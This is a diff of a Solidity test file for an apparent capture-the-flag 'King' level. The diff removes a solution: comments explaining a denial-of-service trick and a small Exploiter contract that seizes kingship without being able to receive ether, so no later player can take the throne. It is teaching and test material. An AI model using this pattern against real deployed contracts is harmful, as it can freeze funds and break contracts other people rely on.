@@ -38,25 +38,6 @@ contract TestKing is BaseTest {
 
         vm.startPrank(player, player);
 
-        // As we said in the previous CTF challenge the only way to receive ether are via
-        // 1) A receive function
-        // 2) A payable fallback function
-        // 3) "forced" by a selfdestruct that target our contract
-        // What do you think that could happen in this case when the new king is a contract that cannot receive ether
-        // and someone try to become the newest king?
-        // The contract will revert because the previous king (our contract) have no way to receive the "treasury"!
-
-        Exploiter exploiter = new Exploiter{value: level.prize() + 1}(payable(address(level)));
-
-        assertEq(level._king(), address(exploiter));
-
         vm.stopPrank();
-    }
-}
-
-contract Exploiter {
-    constructor(address payable to) public payable {
-        (bool success, ) = address(to).call{value: msg.value}("");
-        require(success, "we are not the new king");
     }
 }
